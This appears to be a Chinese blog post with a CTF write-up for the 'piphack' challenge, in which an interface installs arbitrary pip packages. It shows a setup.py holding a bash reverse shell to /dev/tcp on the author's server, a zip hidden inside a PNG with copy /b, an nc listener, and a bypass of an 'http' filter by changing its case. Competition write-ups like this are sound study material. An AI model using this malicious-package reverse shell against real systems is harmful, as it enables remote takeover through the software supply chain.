---
title: piphack
date: 2024-03-18 14:31:38
updated: 2024-11-15 21:49:39
categories:
  - 网络安全
  - CTF竞赛
  - 蓝桥杯
  - Misc
tags:
  - 网络安全
  - CTF
  - Misc
permalink: /posts/piphack/
---
## 题目描述

可以安装任意包的接口，你会怎么利用呢?

## 解题

根据搜索该题为`RCE`漏洞的利用，本题的主要原理就是`pip`在下载包以后，会自动进行解压然后执行`setup.py`文件，那么可以人为构造一个带有恶意代码的`setup.py`文件，然后把该文件压缩，和`png`图片合在一起上传至公网服务器上，当题目执行`pip`安装包时，会触发我们自己构建的`setup.py`文件中的代码。

解题需求：要求一台具有稳定`ipv4`地址并开启web服务的服务器；

一、构建恶意图片

1、随便找一张图片；

2、构建反弹shell，使出题服务器使用pip安装时自动与我们的服务器建立`tcp`连接

```python
__import__('os').system("bash -c 'bash -i >& /dev/tcp/自己服务器IP地址/端口号 0>&1'")
```

> 解释：
> `bash -c  "cmd string"`  接的是`shell`命令字符串，用引号括起来，运行后面的命令；
> `bash -i` 创建一个交互式`bash`进程
> `>&`    将标准输入和标准错误输出重定向到文件`/dev/tcp/`自己服务器IP地址/端口号;
> `/dev/tcp/`自己服务器IP地址/端口号 一个特殊的设备，打开了这个文件相当于发出了一个`socket`调用，建立一个`socket`连接;
> `0>&1` 将标准输入重定向到标准输出,使我们既能进行输入，又能看到输出
> 注意服务器的端口一定要是开放的

将上面的代码放入`setup.py`中，然后创建一个文件夹（名字英文任取），将`setup.py`放入文件夹，然后压缩文件夹，得到`文件夹.zip`

3、在`windows`电脑的`cmd`窗口上用命令

```powershell
copy /b tupian.png + 文件夹.zip tupian.png 
```

二、上传图片至服务器网站目录

需注意上传的图片一定要能正常访问，可以在浏览器上测试。

三、开始解题

1、先在服务器上使用`nc`命令监听端口

```shell
sudo nc -lvn 端口
```

![image-20240220161135499](piphack/image-20240220161135499.png)

2、然后用`nc`连接题目给出的地址

![image-20240220161139217](piphack/image-20240220161139217.png)

这里发现题目过滤了`http`，尝试使用`Http`绕过，等待一会儿发现在我们的服务器上已经连接上，说明成功，接下来就是一系列测试命令最终发现`flag{a262d436-704d-402b-881d-c487d7cf945f}`

![image-20240220161144411](piphack/image-20240220161144411.png)

